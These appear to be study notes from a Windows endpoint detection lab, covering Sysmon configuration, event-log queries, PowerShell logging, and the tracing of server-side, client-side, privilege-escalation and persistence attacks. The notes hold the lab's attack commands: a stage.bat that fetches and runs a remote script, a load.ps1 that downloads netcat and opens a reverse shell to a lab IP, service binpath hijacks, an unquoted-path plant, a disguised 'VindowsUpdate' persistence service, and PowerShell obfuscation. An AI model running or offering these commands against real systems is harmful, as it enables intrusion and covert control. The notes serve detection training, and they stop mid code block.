# Remote Access with PowerShell Core

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.51.50
```

```pwsh
Enter-PSSession 192.168.51.10 -Credential offsec -Authentication Negotiate
```

```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /u:offsec /p:lab /v:192.168.51.10
```

# Import Modules

## Sysmon

```pwsh
Import-Module C:\Sysmon\Get-Sysmon.psm1
Import-Module C:\Sysmon\Get-Security.psm1
Import-Module C:\Sysmon\Get-PSLog.psm1
Import-Module C:\Sysmon\Get-WDLog.psm1
```

`C:\Sysmon\Get-Sysmon.psm1`

```pwsh
function Get-SysmonEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-Sysmon/Operational"}

    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }

    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

`C:\Sysmon\Get-Security.psm1`

```pwsh
function Get-SecurityEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Security"}

    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

`C:\Sysmon\Get-PSLog.psm1`

```pwsh
function Get-PSLogEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-PowerShell/Operational"}

    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }

    Get-WinEvent -FilterHashtable $filters
}
```

`C:\Sysmon\Get-WDLog.psm1`

```pwsh
function Get-WDLogEvent {
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-Windows Defender/Operational"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }

    Get-WinEvent -FilterHashtable $filters
}
```

# Windows Endpoint Introduction

## Command Prompt, VBScript, and Powershell

`@ECHO OFF` prevents the individual commands from displaying in the command prompt

```bat
user_hostname.bat
```

```bat
@ECHO OFF
TITLE Example Batch File
ECHO This batchfile will show Windows 10 Operating System information
systeminfo | findstr /C:"Host Name"
systeminfo | findstr /C:"OS Name"
systeminfo | findstr /C:"OS Version"
systeminfo | findstr /C:"System Type"
systeminfo | findstr /C:"Registered Owner"
PAUSE
```

```bat
cscript osinfo.vbs
```

```vb
' List Operating System and Service Pack Information

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
 & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colOSes = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOS in colOSes
  Wscript.Echo "Computer Name: " & objOS.CSName
  Wscript.Echo "Caption: " & objOS.Caption 'Name
  Wscript.Echo "Version: " & objOS.Version 'Version & build
  Wscript.Echo "Build Number: " & objOS.BuildNumber 'Build
  Wscript.Echo "Build Type: " & objOS.BuildType
  Wscript.Echo "OS Type: " & objOS.OSType
  Wscript.Echo "Other Type Description: " & objOS.OtherTypeDescription
  WScript.Echo "Service Pack: " & objOS.ServicePackMajorVersion & "." & _
   objOS.ServicePackMinorVersion
Next
```

```pwsh
Get-ExecutionPolicy
Get-Help Get-CimInstance
Get-Alias gcim
Get-Module | Where-Object { $_.ModuleType -eq "Script" }
```

```pwsh
.\hostinfo.ps1
```

```pwsh
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property CSName, Caption, Version,BuildNumber, BuildType, OSType, RegisteredUser, OSArchitecture, ServicePackMajorVersion, ServicePackMinorVersion
Get-Service | Where-Object { $_.Status -eq "Running" }
```

```pwsh
.\get_avinfo.ps1
```

```pwsh
gcim -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

## Windows Event Log

Find event log files in `C:\Windows\System32\winevt\Logs`, where they are saved as `.evtx` files.

Use the built-in **Windows Event Viewer** to parse the logs.

- `Application` log includes events generated by Windows applications, such as when an application 'hangs' or is unresponsive.
- `Security` logs include authentication and other security-related activities.
- `Setup` logs provide details about upgrade installations or replacements by Windows Update.
- `System` logs contain native OS behaviors that do not fit in any of the other categories, e.g. system restarts or the mounting of drives.

The `Application and Services Logs` provide detailed event logging of services and applications. They may be developed by Microsoft or 3rd parties who have developed their own providers and defined their own events which need to be tracked.

Each Windows event entry has a level, or **severity**:
- `Information` level: The initiated activity has completed successfully.
- `Warning` level: There is no immediate problem but one may arise in the future.
- `Error` and `Critical` messages: Failure, though Critical failures are more severe than Error-level events.

The `Security` logs include `Audit Success` and `Audit Failure` event levels. These can be configured in the **Local Group Policy Editor**, or applied from a group policy pushed from the Domain controller.

2 major elements in the XML:
- `System` element are tags such as `Provider Name`, `EventID`, and `TimeCreated`.
- `EventData` elements change with every type of event that is logged.

E.g. The `Provider Name` indicates that the provider for `Security` logs is named `Microsoft-Windows-Security-Auditing`.

Event ID `4624`: "An account was successfully logged on".

- `TargetUserName` tag: The user logged on to our Windows endpoint.
- `LogonType 10`: `RemoteInteractive` logon refers to the use of Remote Desktop services to access the Windows machine, using the RDP.
- `LogonType 3`: A user or computer logged on to this computer from the network.
- `IpAddress` tag contains the source IP of the remote connection.

Get the details about the Windows logs

```pwsh
Get-WinEvent -ListLog Application, Security, Setup, System
```

```pwsh
Get-WinEvent -LogName Security | Select-Object -first 10
Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq "4624" } | Select-Object -Property TimeCreated,Message -first 10
Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime="4/23/2024 14:00:00"; EndTime="4/23/2024 14:30:00"; ID=4624} | Select-Object -Property TimeCreated,Message
```

Filter `LogonType 10`

```pwsh
Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2021 00:00:00"; EndTime="4/26/2021 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
```

Event ID `1102`: Use `Clear Log...` to clear the Security logs
Event ID `4776`: The computer attempted to validate the credentials for an account.

## Sysmon

Sysmon events are stored in `Applications and Services Logs/Microsoft/Windows/Sysmon/Operational`.

Windows Event `4688` and Sysmon Event `1` are both events related to new processes being created on the system.
- But the Sysmon Event `1` `EventData` contains file verification **hashes** that act as a fingerprint of the file that created the process.

The configuration file for Sysmon is separated into 2 major parts:

- Configuration entries, (or behaviors)
- Event filtering entries, which contain rules for all 27 Sysmon event types.

- `imphash` is a forensic data that **hashes the file's characteristics** rather than the file itself, including the libraries used by the executable, and the order in which they are stored within the file for reference.
- `CopyOnDeletePE` tag indicates if Sysmon should make a copy of portable executables that are deleted by any user.
- `ArchiveDirectory` tag: The directory path (from the root of the C drive) where deleted copies should be stored.
- `group relation` of `OR` to make each rule independent.

`https://github.com/Neo23x0/sysmon-config`

`sysmonconfig-export.xml`

```xml
<Sysmon schemaversion="3.2">
  <HashAlgorithms>MD5,SHA256,IMPHASH</HashAlgorithms>
  <CopyOnDeletePE>True</CopyOnDeletePE>
  <ArchiveDirectory>BackupDeleted</ArchiveDirectory>
 <EventFiltering>
  <RuleGroup name="Process Rules" groupRelation="or">
    <ProcessCreate onmatch="exclude">
      <Image condition="is">C:\Program Files\Windows Media Player\wmplayer.exe</Image>
      <Image condition="is">C:\Windows\system32\powercfg.exe</Image>
  </RuleGroup>
  <RuleGroup name="Driver Rules" groupRelation="or">
    <Driverload onmatch="exclude">
      <Signature condition="begin with">AMD</Signature>
      <Signature condition="contains">microsoft</Signature>
      <Signature condition="contains">windows</Signature>
  </RuleGroup>
  <RuleGroup name="Network Process Rules" groupRelation="or">
    <NetworkConnect onmatch="exclude">
      <Image condition="end with">Chrome.exe</Image>
      <Image condition="end with">msedge.exe</Image>
    </NetworkConnect>
  </RuleGroup>
  <RuleGroup name="Network Port Rules" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">8080</DestinationPort>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
  </EventFiltering>
</Sysmon>
```

`Network Process Rules` rule group: A network connection matching those ports (`8080, 443`) can be ignored if they were initiated by either the Chrome or Edge web browsers.

Dump the current configuration (confirms that Sysmon is installed and running)

```pwsh
.\Sysmon64.exe -c | Select-Object -first 10
```

Reconfigure an active Sysmon with a configuration file

```pwsh
.\Sysmon64.exe -c C:\sysmonconfig-export.xml
```

E.g., sysmon configuration file:

```xml
  <RuleGroup name="" groupRelation="or">
    <FileCreate onmatch="include">
    ...
      <TargetFilename condition="end with">.bat</TargetFilename>
    ...
```

```pwsh
"Test" | Out-File FileCreate.bat
```

```pwsh
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"
```

```pwsh
Get-Module | Where-Object { $_.ModuleType -eq "Script" }
```

Search for all events

```pwsh
Get-SysmonEvent $null "04/28/2021 13:55:00" "04/28/2021 14:00:00"
```

Search for `FileCreate` events

```pwsh
Get-SysmonEvent 11 "4/28/2021 13:48:00" "4/28/2021 13:49:00" | Format-List
```

Search for `ProcessCreate` events, filter out the `ProcessId 2032`

```pwsh
Get-SysmonEvent 1 $null "7/28/2021 13:48:42" | Where-Object { $_.properties[3].value -eq 2032 } | Format-List
```

# Windows Server Side Attacks

## Credential Abuse

### Suspicious Logins

Search for **Logon events** with the `Event ID 4624` occurring over the course of 2 days where it is expected that no users will be logged in (such as a weekend).

`LogonType 10` indicates a `RemoteInteractive` logon (the use of Remote Desktop services to access the Windows machine, using the RDP)

```pwsh
Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2024 19:00:00"; EndTime="4/26/2024 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
```

Search for a **logoff** event with the `Event ID 4634` where the `Logon ID 0x323466`

```pwsh
Get-SecurityEvent 4634 "5/1/2021 03:21:26" "5/3/2021 07:00:00" | Where-Object { $_.properties[3].value -eq 0x323466 } | Format-List
```

### Brute-Force Logins

Get a list of all **failed Logon events** with the Event ID `4625` that occurred in the span of a single day

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00"
```

`LogonType 3`: network-based logon.

`hydra` uses Network-Level Authentication (NLA). NLA forces an authentication to take place before the RDP session is initiated.

The `Status` code `C000006D`: the failure is due to a bad username or authentication information. Other error codes specify that the username is nonexistent or that the password was incorrect.

Since NLA is enabled, the **SubStatus** code `C000006A`.

Both the Status and Substatus explain the authentication failure.

If we suspect logons are indicative of a brute force credential attack, extract `Target User Name, Status, SubStatus, Logon Type, Workstation Name, and IP Address`.

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00" | Format-List TimeCreated, @{Label = "Logon Type"; Expression = {$_.properties[10].value}}, @{Label = "Status"; Expression = {'{0:X8}' -f $_.properties[7].value}}, @{Label = "Substatus"; Expression = {'{0:X8}' -f $_.properties[9].value}}, @{Label = "Target User Name"; Expression = {$_.properties[5].value}}, @{Label = "Workstation Name"; Expression = {$_.properties[13].value}}, @{Label = "IP Address"; Expression = {$_.properties[19].value}}
```

Search for successful authentications from that IP in this time frame:

```pwsh
Get-SecurityEvent 4624 "5/6/2021 09:36:44" "5/6/2021 09:37:44" | Where-Object { $_.properties[18].value -eq "192.168.51.50" }
```

Event ID `4801`: A workstation being locked or workstation being unlocked.
`LogonType 7`: This workstation was unlocked.


## Web Application Attacks

IIS has a built-in logging mechanism that logs to `C:\inetpub\logs\LogFiles`. E.g. `C:\inetpub\logs\LogFiles\W3SVC1\u_ex210506.log.`

List the log files for the 1st instance (or site ID) of W3SVC1:

```bat
dir C:\inetpub\logs\LogFiles\W3SVC1
```

Any additional web service instances hosted by IIS would log under sequentially-numbered directories, such as W3SVC2, W3SVC3, etc.

Each log file begins with `u_ex` followed by a date code formatted as YYMMDD.


### Local File Inclusion

### Command Injection

The IIS log file reveals an HTTP POST to the vulnerable PATH used by the exploit.

We don't see the POSTDATA in IIS logs, but a direct attempt at posting data to this page at this particular time from `192.168.51.50`.

Over **3700 milliseconds elapsed** while executing the query.

=> A greater source of suspicion for anomalous activity.

Get any and all Sysmon events

```pwsh
Get-SysmonEvent $null "05/10/2021 16:02:00" "5/10/2021 16:03:00"
```

Search for Sysmon's `ProcessCreate` events

```pwsh
Get-SysmonEvent 1 "05/10/2021 16:02:33" "5/10/2021 16:02:35" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

When chaining processes with parent processes, use the **process/parent process IDs** located in the `ProcessCreate` events.

When anomalous activity is identified, trace from parent to parent until we find the origin of the activity.

### File Upload

`stage.bat`

```bat
@ECHO OFF
powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.51.50:8000/load.ps1')"
```

`load.ps1`

```pwsh
del stage.bat
wget http://192.168.51.50:8000/nc.exe -O /Windows/Temp/nc.exe
/Windows/Temp/nc.exe 192.168.51.50 4444 -e cmd.exe
```

=> Tracking the upload and execution of our `stage.bat` and `load.ps1` scripts

Since our IIS logs showed activity at 2:26:17 PM, query on all Sysmon events from 2:26 PM to 2:27 PM

```pwsh
Get-SysmonEvent $null "05/13/2021 14:26:00" "5/13/2021 14:27:00"
```

Gather all `ProcessCreate` events that occurred at the 17s mark. => 2 command injections downloading and running `stage.bat`.

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

There were 2 `FileCreate` events in the same timeframe.

- `stage.bat` being written via `certutil.exe`.
- A PowerShell script in `C:\Windows\Temp` is an artifact of using `Invoke-Expression` to read in a PowerShell script.

```pwsh
Get-SysmonEvent 11 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List @{Label = "Rule"; Expression = {$_.properties[0].value}}, @{Label = "PID"; Expression = {$_.properties[3].value}},@{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "TargetFile"; Expression = {$_.properties[5].value}}
```

We have the PID for PowerShell (`6784`).

Any `ProcessCreate` events with this PID can be traced back to this event => extract the Process ID (`PID`) and the Parent Process ID (`PPID`):

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:17" "5/13/2021 14:26:19" | Format-List TimeCreated, @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "PPID"; Expression = {$_.properties[19].value}}, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

Search for `NetworkConnect` events

```pwsh
Get-SysmonEvent 3 "5/13/2021 2:26:18" "5/13/2021 2:26:20" | Format-List @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "User"; Expression = {$_.properties[5].value}}, @{Label = "Source IP"; Expression = {$_.properties[9].value}}, @{Label = "Source Port"; Expression = {$_.properties[11].value}}, @{Label = "Destination IP"; Expression = {$_.properties[14].value}}, @{Label = "Destination Port"; Expression = {$_.properties[16].value}}
```

### Binary Attacks

```pwsh
Start-Service -Name "Sync Breeze Enterprise"
Get-Service -Name "Sync Breeze Enterprise" | Format-List -Property Status,Name,DisplayName
```

`ProcessCreate` event: A **command prompt** was initiated by `syncbrs.exe`. The User field indicates that the `SYSTEM` user started the command prompt.
`NetworkConnect` events: connections from our attacker machine to SyncBreeze on port 8080. The reverse shell also left traces as it called back to our Kali VM on port 4444.

### Windows Defender Exploit Guard (WDEG)

Windows Defender Exploit Guard (WDEG) is disabled by default. It was developed to address file-less malware attacks, or malware that operates almost exclusively in memory.

WDEG has 4 major components:

1. **Attack Surface Reduction** (ASR) addresses file-less malware attacks that hide within Microsoft Office documents. ASR can also block executable content or network communications from Adobe Reader, VBScript, and JavaScript.

2. **Controlled folder access**: prevent applications from writing or making changes to directories specified by policy (Modern ransomware often maliciously encrypts user data). By default, the home directory of users (C:\Users\<user account>) are protected.

3. **Network protection** relies on Microsoft's Intelligent Security Graph as a threat intelligence resource for domain and IP reputation. Anything less-than-reputable can be halted independently of what process or application initiated it.

4. **Exploit protection**: Administrators must import an XML configuration file to set this up.

=> Create a rule to enact **Data Execution Prevention** (DEP) for SyncBreeze to render the exploit inoperable. Rules can be created through the Windows GUI, by importing an XML Configuration, or with PowerShell.

Validate API Invocation (or **CallerCheck**) is a protection mechanism that watches how API calls are invoked. This control will only allow functions to be accessed with a **call** assembly instruction, rather than a **return** instruction.

Using return instructions to execute API calls is known as **Return-Oriented Programming** (ROP) and is used to bypass data execution prevention.

Enable exploit protection for a specific process (The exploit will fail)

```pwsh
Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable EnableRopCallerCheck
Get-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe'
Restart-Service -Name "Sync Breeze Enterprise"
```

The event that is generated will not appear in Windows Security event logs, but rather in the `Security-Mitigations` logs.

```pwsh
Get-WinEvent -FilterHashTable @{LogName = 'Microsoft-Windows-Security-Mitigations/UserMode'; StartTime = '5/25/2021 13:42:28'; EndTime = '5/25/2021 13:42:30'} | Format-List -Property Id, TimeCreated, LevelDisplayName, Message
```

Turn auditing on for Windows exploit protection. (should not block the activity but still generate events.)
- Remove our SyncBreeze configuration
- Reconfigure our exploit protections to only audit the return-oriented API calls used by the SyncBreeze exploit.

```pwsh
Remove-Item -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\syncbrs.exe'
Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable AuditEnableRopCallerCheck
Restart-Service -Name "Sync Breeze Enterprise"
```

# Windows Client Side Attacks

Query for the `ProcessCreate` event:

- PowerShell was started with a base64-encoded payload.
- The `CommandLine` field shows the abbr. payload as executed on the command line.
- The Parent Process ID belongs to Microsoft Word, and
- The `ParentCommandLine` reveals the Word document `Engineer_Resume.doc`.

```pwsh
Get-SysmonEvent 1 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
```

Query for the `FileCreate` event: A temporary PowerShell file is written to `C:\Users\offsec\AppData\Local\Temp`

```pwsh
Get-SysmonEvent 11 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
```

Query for the `DNSEvent` created by our attachnment (Event ID 22)

```pwsh
Get-SysmonEvent 22 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Format-List
```

Two `NetworkConnect` events: filter on the destination IP `192.168.51.50` (PowerShell is initiating separate network sessions as a result of the two-stage malware infection)

```pwsh
Get-SysmonEvent 3 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
```

## PowerShell Logging

3 different types of PowerShell logging: Module, Script Block, and Transcription.

Launch the Local Group Policy Editor, `gpedit.msc`, and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`

### PowerShell Module Logging

Change the setting `Turn on Module Logging` from `Not Configured` to `Enabled`.

This also activates the `Show...` button next to `Module Names` > specify what modules this policy needs to log.

Rather than list out every possible module, enter a wildcard (`*`) character so that we can log all PowerShell modules.

Collect information on all currently running processes

```pwsh
Get-WmiObject -Class Win32_Process | Format-Table ProcessId, ParentProcessId, Name; Write-Host (Get-Date)
```

Event ID `4103` for pipeline execution events enabled by module logging

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="6/14/2021 13:25:52"; EndTime="6/14/2021 13:25:54"; ID=4103} | Format-List
```

- `Command Name` indicates which cmdlet initiated this pipeline execution. Or the Script Name.
- `Sequence Number` tracks the order in which PowerShell events execute.
- `Pipeline ID` tracks commands within a given pipeline.

We could trace an entire series of PowerShell commands using the Pipeline ID, and order them based on the Sequence Number.


### PowerShell Script Block Logging

Open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.

Change the setting `Turn on PowerShell Script Block Logging` from Not Configured to Enabled.

Uncheck the option to `Log script block execution start / stop events`.

The use of script block logging to help with the **deobfuscation** of PowerShell commands.

```pwsh
{ "This is a script block" }; Write-Host (Get-Date)
```

The Event ID `4104` for remote command execution events enabled by script block logging.

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="06/15/2021 14:49:42"; EndTime="06/15/2021 14:49:44"; ID=4104} | Format-List
```

### PowerShell Transcription

PowerShell transcription will generate full records of a PowerShell session, with all input and output stored in a text file.

To enable transcription for PowerShell, open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.

Change the setting `Turn on Powershell Transcription` from `Not Configured` to `Enabled`.

Also select the checkbox for `Include Evocation Headers` so that timestamps are produced for each command in our transcripts.

Navigate to the `C:\Users\offsec\Documents\YYYYMMDD` directory, we'll find a text file titled `PowerShell_transcript.HOSTNAME.UNIQUEID.YYYYMMDDHHMMSS.txt`

### Case Study: Phishing Attacks

```pwsh
Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table Timecreated, LevelDisplayName, Message
Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
```

```pwsh
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table TimeCreated, LevelDisplayName, Message
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
```

Extracting the Payload from Each Module Log Event Message

```pwsh
Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:44:59" | Format-List TimeCreated, @{Label = "Payload"; Expression = {$_.properties[2].value}}
```

Obfuscate a PowerShell command

```pwsh
Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

Choose `Ticks` as our obfuscation technique for the command tokens.
Arguments can also be obfuscated using random case, concatenation of strings, and **reordering** the text altogether

```
SET SCRIPTBLOCK Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)
back
show
```

CommandLineSyntax:

```pwsh
Invoke-Obfuscation -ScriptBlock {Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)} -Command 'Token\Command\1,Token\Argument\4' -Quiet
```

Query script block events => the obfuscation makes it harder for us to understand what's happening

```pwsh
Get-PSLogEvent 4104 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
```

Query module log events within the same time range

```pwsh
Get-PSLogEvent 4103 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
```

Use **Revoke-Obfuscation** (`https://github.com/danielbohannon/Revoke-Obfuscation`) to detect obfuscated PowerShell commands and scripts. In some cases, it can even help reconstruct an obfuscated PowerShell script that has been executed.

```pwsh
Import-Module C:\tools\windows_client_side_attacks\Revoke-Obfuscation\Revoke-Obfuscation.psm1
```

To export PowerShell logs from the command line, use `wevtutil`, a command-line utility for listing and saving event logs in an XML-based event file format (`.evtx`).

```pwsh
wevtutil export-log Microsoft-Windows-PowerShell/Operational C:\users\offsec\Desktop\pwsh_export.evtx
```

Reassemble script blocks from script block events (Event ID 4104)

```pwsh
Get-RvoScriptBlock -Path 'C:\Users\offsec\Desktop\pwsh_export.evtx' -Verbose
```

# Windows Privilege Escalation

```pwsh
.\accesschk64.exe -uws "Everyone" "C:\Program Files (x86)\"
```

```pwsh
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Format-List
```

## Bypassing UAC

Output the modify registry events with the `Event ID 13`.

```pwsh
Get-SysmonEvent 13 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
```

`ProcessCreate` events

```pwsh
Get-SysmonEvent 1 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
```

Query the PowerShell module log entries

```pwsh
Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45"
Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45" | Format-List
```

Use the `Where-Object` cmdlet on the `Image` field containing the string "fodshell"

```pwsh
Get-SysmonEvent 1 "06/28/2021 13:41:00" "06/28/2021 13:42:00" | Where-Object { $_.properties[4].value -like "*fodshell*" } | Format-List
```

## Escalating to SYSTEM

### Service Creation

Use Windows services and named pipes to escalate privileges (Meterpreter `getsystem` command)

Event with ID 4697: A service was installed in the system

```pwsh
Get-SecurityEvent 4697 "6/30/2021 12:49:31" "6/30/2021 12:49:33" | Format-List
```

Display `RegistryEvent` entries

```pwsh
Get-SysmonEvent 13 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
```

1. Writes `0x00000003` to the `Start` key of the hvaukz service. This sets the new service to a `Manual` start-up, rather than when the system boots.
2. Sets the `ImagePath` key of the `hvaukz` service to the named pipe.
3. Changes the value of the `Start` key for the hvaukz service. The value `0x00000004` indicates that the service will be changed from Manual to `Disabled`.

```pwsh
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\hvaukz
```

View the `ProcessCreate` event

```pwsh
Get-SysmonEvent 1 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
```

### Attacking Service Permissions

When querying services with Service Control in PowerShell, use the `sc.exe` filename and not just `sc`.

The `Set-Content` cmdlet in PowerShell can be abbreviated with `sc`, and the PowerShell prompt prioritizes cmdlets over Windows commands.

```pwsh
sc.exe qc Serviio
```

Enumerate the permissions of installed services

* `-c` argument to specify a Windows Service by name, the wildcard * to query all Windows services
* `-l` for the full security descriptor

```pwsh
.\accesschk64.exe -c Serviio -l
```

```pwsh
C:\Windows\system32\sc.exe config Serviio binpath= 'C:\tools\servshell_443.exe'
net start serviio
```

Examine the `ProcessCreate` event (sc.exe made the configuration change)

```pwsh
Get-SysmonEvent 1 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
```

Review the `RegistryEvent` entry (`HKLM\System\CurrentControlSet\Services\Serviio\ImagePath` Windows Registry key is changed)

```pwsh
Get-SysmonEvent 13 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
```

```pwsh
Get-SysmonEvent 1 "7/1/2021 10:56:09" "7/1/2021 10:56:11" | Format-List @{ Label = 'UtcTime'; Expression = { $_.properties[1].value }}, @{ Label = 'Image'; Expression = { $_.properties[4].value }}, @{ Label = 'ProcessId'; Expression = { $_.properties[3].value }}, @{ Label = 'CommandLine'; Expression = { $_.properties[10].value }}, @{Label = 'User'; Expression = { $_.properties[12].value }}, @{ Label = 'ParentImage'; Expression = { $_.properties[20].value }}, @{ Label = 'ParentProcessId'; Expression = { $_.properties[19].value }}
```

### Leveraging Unquoted Service Paths

```pwsh
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

```pwsh
sc.exe qc IOBitUnSvr
...
BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

```pwsh
copy .\servshell_443.exe 'C:\Program Files (x86)\IObit\IOBit.exe'
shutdown -r -t 0
```

`FileCreate` events

```pwsh
Get-SysmonEvent 11 "7/8/2021 10:49:33" "7/8/2021 10:49:35" | Format-List
```

Search across all `ProcessCreate` events where the Image field contains the wildcarded filename `IOBit.exe`

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*IOBit.exe*" } | Format-List
```

# Windows Persistence

## Persistence on Disk

### Persisting via Windows Service

Creates a new service named "VindowsUpdate".
- `(start= auto)`: the service should start after the operating system boots, even if no users have logged on.
- `error= ignore` parameter indicates that service errors are logged without notifying the user or interrupting system startup.
- `binpath= C:\tools\windows_persistence\prst_servshell443.exe` details the location of the binary.

```pwsh
sc.exe create VindowsUpdate start= auto error= ignore binpath= C:\tools\windows_persistence\prst_servshell443.exe
shutdown -r -t 0
```

Query all events in the Security log

```pwsh
Get-SecurityEvent $null "10/29/2021 11:43:00" "10/29/2021 11:44:00" | Format-List
```

`Event Id 4697`: A service was installed in the system.

Note that `prst_servshell443.exe` was on the target already. Attackers trying to create their own service will often upload their preferred service binary first. => search for `FileCreate` events.

1 ProcessCreate event (`sc.exe`) and 2 RegistryEvent entries.

```pwsh
Get-SysmonEvent 1 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
```

```pwsh
Get-SysmonEvent 13 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
```

The Service Control Manager (`services.exe`) has added new values in the `HKEY_LOCAL_MACHINE` (HKLM) hive.

- The `Start` value created in the `VindowsUpdate` key. The `Start` value contains a single DWORD for the `Startup` type. The 32-bit value of `2` represents the `AUTO` Startup type that we set for this service.

- The `ImagePath` value of our service configuration, which is the full path to `prst_servshell443.exe`.


Filter on `ProcessCreate` events where the `Image` field contains the filename `prst_servshell443.exe`

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*prst_servshell443.exe*" } | Format-List
```

Find any other `ProcessCreate` events where the `ParentProcessId` (PPID) matches the ProcessId of `prst_servshell443.exe` (3140)

```pwsh
